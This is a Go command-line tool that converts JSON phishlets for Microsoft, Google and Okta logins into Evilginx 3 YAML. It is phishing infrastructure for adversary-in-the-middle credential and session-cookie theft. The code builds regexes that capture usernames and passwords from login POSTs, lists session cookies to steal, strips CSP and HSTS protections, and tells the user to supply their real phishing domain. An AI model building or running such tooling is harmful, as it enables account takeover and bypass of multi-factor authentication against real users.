// json2evilginx converts JSON phishlets from this project into Evilginx 3 YAML format
// using Go text/template engine with provider-specific YAML templates.
//
// Usage:
//
//	# Convert a single phishlet
//	go run ./scripts/json2evilginx --input proxy-server/phishlets/microsoft.json --output exports/evilginx/microsoft.yaml
//
//	# Convert all phishlets at once
//	go run ./scripts/json2evilginx --all
//
//	# Custom random string prefix
//	go run ./scripts/json2evilginx --input proxy-server/phishlets/okta.json --phish-sub-prefix=camp1

package main

import (
	"embed"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"
	"time"
)

//go:embed templates/*.tmpl
var templateFS embed.FS

// JSON input structures — match the project's phishlet schema.
type jsonPhishlet struct {
	Name             string            `json:"name"`
	Label            string            `json:"label"`
	Upstream         string            `json:"upstream"`
	Hostname         string            `json:"hostname"`
	UpstreamHosts    []string          `json:"upstream_hosts"`
	ProxyPaths       []string          `json:"proxy_paths"`
	CredentialFields credentialFields  `json:"credential_fields"`
	SessionCookies   []string          `json:"session_cookies"`
	Rewrite          rewrite           `json:"rewrite"`
	PathMap          map[string]string `json:"path_map"`
}

type credentialFields struct {
	Username []string `json:"username"`
	Password []string `json:"password"`
}

type rewrite struct {
	StripCSP          bool `json:"strip_csp"`
	StripXFO          bool `json:"strip_xfo"`
	StripHSTS         bool `json:"strip_hsts"`
	StripCookieSecure bool `json:"strip_cookie_secure"`
	StripCookieDomain bool `json:"strip_cookie_domain"`
	RewriteLocation   bool `json:"rewrite_location"`
}

// TemplateData is the data struct passed to Go templates for YAML generation.
// It supports both the microsoft template (individual PhishSub fields, Hostname)
// and the google/okta templates (PhishSubN array, PhishDomain, regexes).
type TemplateData struct {
	// Common fields
	Name           string
	Label          string
	SessionCookies []string
	UsernameFields []string
	PasswordFields []string
	ProxyPaths     []string

	// Microsoft template fields — individual named subdomain tokens
	Hostname     string // full phishing hostname, e.g. "login.glnt.cc"
	UpstreamHost string // primary upstream host, e.g. "login.microsoftonline.com"
	PhishSub     string
	PhishSub2    string
	PhishSub3    string
	PhishSub4    string
	PhishSub5    string
	PhishSub6    string
	PhishSub7    string
	PhishSub8    string
	PhishSub9    string
	PhishSub10   string
	PhishSub11   string
	PhishSub12   string
	PhishSub13   string
	PhishSub14   string
	PhishSub15   string
	PhishSub16   string
	PhishSub17   string
	PhishSub18   string
	PhishSub19   string
	PhishSub20   string
	PhishSub21   string
	PhishSub22   string
	PhishSub23   string
	PhishSub24   string
	PhishSub25   string

	// Google / Okta template fields — array-based subdomain tokens
	PhishSubN      []string
	PhishDomain    string
	PhishHost      string
	UpstreamDomain string
	UsernameRegex  string
	PasswordRegex  string
	OrgSubdomain   string
}

// randSeq generates a random string of lowercase alphanumeric characters of length n.
func randSeq(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyz0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// randSeqN generates n unique random strings, each of length m.
func randSeqN(n, m int) []string {
	seen := make(map[string]bool)
	result := make([]string, 0, n)
	for len(result) < n {
		s := randSeq(m)
		if !seen[s] {
			seen[s] = true
			result = append(result, s)
		}
	}
	return result
}

// splitHost extracts the leftmost subdomain and the rest as the domain.
// e.g., "login.microsoftonline.com" => ("login", "microsoftonline.com")
// e.g., "okta.com" => ("", "okta.com")
func splitHost(host string) (sub, domain string) {
	parts := strings.Split(host, ".")
	if len(parts) <= 2 {
		return "", host
	}
	return parts[0], strings.Join(parts[1:], ".")
}

// normalizeURL ensures the upstream string is parsable as a URL.
func normalizeURL(raw string) (*url.URL, error) {
	if !strings.Contains(raw, "://") {
		raw = "https://" + raw
	}
	return url.Parse(raw)
}

// buildCredRegex builds a regex alternation that matches form-encoded POST bodies.
// fields=["loginfmt","login","email"] => "(?:loginfmt|login|email)=([^&]+)"
func buildCredRegex(fields []string) string {
	if len(fields) == 0 {
		return ""
	}
	escaped := make([]string, len(fields))
	for i, f := range fields {
		escaped[i] = regexp.QuoteMeta(f)
	}
	return "(?:" + strings.Join(escaped, "|") + ")=([^&]+)"
}

// extractOrgSubdomain tries to extract the Okta organization subdomain from a hostname.
// For "acme.okta.com" returns "acme".
// Falls back to "your-org" if nothing can be extracted.
func extractOrgSubdomain(hostname string) string {
	if hostname == "" {
		return "your-org"
	}
	if strings.HasSuffix(hostname, ".okta.com") ||
		strings.HasSuffix(hostname, ".oktapreview.com") ||
		strings.HasSuffix(hostname, ".okta-emea.com") {
		sub, _ := splitHost(hostname)
		if sub != "" {
			return sub
		}
	}
	sub, _ := splitHost(hostname)
	if sub != "" && sub != "idp" {
		return sub
	}
	if strings.HasPrefix(hostname, "idp.") {
		rest := strings.TrimPrefix(hostname, "idp.")
		parts := strings.Split(rest, ".")
		if len(parts) > 0 && parts[0] != "" {
			return parts[0]
		}
	}
	return "your-org"
}

// selectTemplate maps a phishlet name to its template file path within the embed FS.
func selectTemplate(name string) string {
	switch strings.ToLower(name) {
	case "microsoft", "microsoft-personal":
		return "templates/microsoft.yaml.tmpl"
	case "google":
		return "templates/google.yaml.tmpl"
	case "okta":
		return "templates/okta.yaml.tmpl"
	default:
		return ""
	}
}

// applyPrefix prepends the given prefix to each string in the slice in-place.
func applyPrefix(prefix string, strs []string) {
	if prefix == "" {
		return
	}
	for i := range strs {
		strs[i] = prefix + strs[i]
	}
}

// setPhishSubFields assigns the first 25 random strings to the individual
// PhishSub..PhishSub25 fields and the full set of 40 to PhishSubN.
func setPhishSubFields(td *TemplateData, tokens []string) {
	fieldMap := []*string{
		&td.PhishSub, &td.PhishSub2, &td.PhishSub3, &td.PhishSub4, &td.PhishSub5,
		&td.PhishSub6, &td.PhishSub7, &td.PhishSub8, &td.PhishSub9, &td.PhishSub10,
		&td.PhishSub11, &td.PhishSub12, &td.PhishSub13, &td.PhishSub14, &td.PhishSub15,
		&td.PhishSub16, &td.PhishSub17, &td.PhishSub18, &td.PhishSub19, &td.PhishSub20,
		&td.PhishSub21, &td.PhishSub22, &td.PhishSub23, &td.PhishSub24, &td.PhishSub25,
	}
	for i, f := range fieldMap {
		if i < len(tokens) {
			*f = tokens[i]
		}
	}
	td.PhishSubN = tokens
}

// buildTemplateData constructs the template data from a parsed JSON phishlet.
func buildTemplateData(in *jsonPhishlet, prefix string) (*TemplateData, error) {
	// Parse upstream URL
	upURL, err := normalizeURL(in.Upstream)
	if err != nil {
		return nil, fmt.Errorf("invalid upstream URL %q: %w", in.Upstream, err)
	}
	upHost := upURL.Hostname()
	_, upDomain := splitHost(upHost)

	// Determine phishing hostname
	var phSub, phDomain, phHost string
	if in.Hostname != "" {
		phHost = in.Hostname
		phSub, phDomain = splitHost(phHost)
	} else {
		// Auto-generate placeholder hostname
		phSub = randSeq(8)
		phDomain = "example.com"
		if prefix != "" {
			phSub = prefix + phSub
		}
		phHost = phSub + "." + phDomain
	}

	// Generate 40 unique random subdomain tokens for templates
	tokens := randSeqN(40, 8)
	applyPrefix(prefix, tokens)

	// Build credential regexes
	userRE := buildCredRegex(in.CredentialFields.Username)
	passRE := buildCredRegex(in.CredentialFields.Password)

	// Extract org subdomain for Okta
	orgSub := extractOrgSubdomain(in.Hostname)

	td := &TemplateData{
		Name:           in.Name,
		Label:          in.Label,
		Hostname:       phHost,
		UpstreamHost:   upHost,
		SessionCookies: in.SessionCookies,
		UsernameFields: in.CredentialFields.Username,
		PasswordFields: in.CredentialFields.Password,
		ProxyPaths:     in.ProxyPaths,
		PhishDomain:    phDomain,
		PhishHost:      phHost,
		UpstreamDomain: upDomain,
		UsernameRegex:  userRE,
		PasswordRegex:  passRE,
		OrgSubdomain:   orgSub,
	}
	setPhishSubFields(td, tokens)

	return td, nil
}

// executeTemplate loads, executes, and writes the template output to the given path.
func executeTemplate(tmplName, outputPath string, data *TemplateData) error {
	tmpl, err := template.ParseFS(templateFS, tmplName)
	if err != nil {
		return fmt.Errorf("parse template %q: %w", tmplName, err)
	}

	if err := os.MkdirAll(filepath.Dir(outputPath), 0o755); err != nil {
		return fmt.Errorf("create output dir: %w", err)
	}

	f, err := os.Create(outputPath)
	if err != nil {
		return fmt.Errorf("create output file: %w", err)
	}
	defer f.Close()

	// Warn if hostname was auto-generated (before template output)
	if data.PhishDomain == "example.com" {
		fmt.Fprintf(f, "# WARNING: No hostname was defined in the JSON phishlet.\n")
		fmt.Fprintf(f, "#          A placeholder hostname %q was auto-generated.\n", data.PhishHost)
		fmt.Fprintf(f, "#          You MUST update this to your actual phishing domain before using this phishlet.\n")
		fmt.Fprintf(f, "#\n")
	}

	if err := tmpl.Execute(f, data); err != nil {
		return fmt.Errorf("execute template: %w", err)
	}

	return nil
}

// convertFile reads a JSON phishlet and writes the corresponding Evilginx YAML.
func convertFile(inputPath, outputPath, prefix string) error {
	data, err := os.ReadFile(inputPath)
	if err != nil {
		return fmt.Errorf("read input %q: %w", inputPath, err)
	}

	var p jsonPhishlet
	if err := json.Unmarshal(data, &p); err != nil {
		return fmt.Errorf("parse JSON: %w", err)
	}

	if p.Name == "" {
		return fmt.Errorf("phishlet has no 'name' field")
	}
	if p.Upstream == "" {
		return fmt.Errorf("phishlet has no 'upstream' field")
	}

	tmplName := selectTemplate(p.Name)
	if tmplName == "" {
		return fmt.Errorf("no template for phishlet %q — supported: microsoft, microsoft-personal, google, okta", p.Name)
	}

	td, err := buildTemplateData(&p, prefix)
	if err != nil {
		return fmt.Errorf("build template data: %w", err)
	}

	if outputPath == "" {
		outputPath = filepath.Join("exports", "evilginx", p.Name+".yaml")
	}

	if err := executeTemplate(tmplName, outputPath, td); err != nil {
		return fmt.Errorf("execute template: %w", err)
	}

	return nil
}

// convertAll processes every .json file in phishletDir and writes YAML to outputDir.
func convertAll(phishletDir, outputDir, prefix string) error {
	entries, err := os.ReadDir(phishletDir)
	if err != nil {
		return fmt.Errorf("read phishlet dir %q: %w", phishletDir, err)
	}

	converted := 0
	skipped := 0
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".json") {
			continue
		}
		inputPath := filepath.Join(phishletDir, entry.Name())
		outName := strings.TrimSuffix(entry.Name(), ".json") + ".yaml"
		outputPath := filepath.Join(outputDir, outName)

		data, err := os.ReadFile(inputPath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Skipping %s: read error: %v\n", entry.Name(), err)
			skipped++
			continue
		}
		var p jsonPhishlet
		if err := json.Unmarshal(data, &p); err != nil {
			fmt.Fprintf(os.Stderr, "Skipping %s: parse error: %v\n", entry.Name(), err)
			skipped++
			continue
		}
		if selectTemplate(p.Name) == "" {
			fmt.Fprintf(os.Stderr, "Skipping %s: no template for phishlet %q\n", entry.Name(), p.Name)
			skipped++
			continue
		}

		fmt.Fprintf(os.Stderr, "Converting %s -> %s\n", inputPath, outputPath)
		if err := convertFile(inputPath, outputPath, prefix); err != nil {
			return fmt.Errorf("convert %s: %w", entry.Name(), err)
		}
		converted++
	}
	fmt.Fprintf(os.Stderr, "Done. Converted %d phishlets to %s/", converted, outputDir)
	if skipped > 0 {
		fmt.Fprintf(os.Stderr, " (%d skipped)", skipped)
	}
	fmt.Fprintln(os.Stderr)
	return nil
}

func run() error {
	inputFlag := flag.String("input", "", "Input JSON phishlet file")
	outputFlag := flag.String("output", "", "Output YAML file (default: exports/evilginx/<name>.yaml)")
	allFlag := flag.Bool("all", false, "Convert all supported phishlets in proxy-server/phishlets/")
	phishletDir := flag.String("phishlet-dir", "proxy-server/phishlets", "Directory containing JSON phishlets")
	outputDir := flag.String("output-dir", "exports/evilginx", "Directory for output YAML files")
	prefixFlag := flag.String("phish-sub-prefix", "", "Optional prefix for all generated random strings")
	flag.Parse()

	rand.Seed(time.Now().UnixNano())

	if *allFlag {
		return convertAll(*phishletDir, *outputDir, *prefixFlag)
	}

	if *inputFlag != "" {
		return convertFile(*inputFlag, *outputFlag, *prefixFlag)
	}

	// No flags: default to batch mode
	return convertAll(*phishletDir, *outputDir, *prefixFlag)
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "ERROR: %v\n", err)
		os.Exit(1)
	}
}
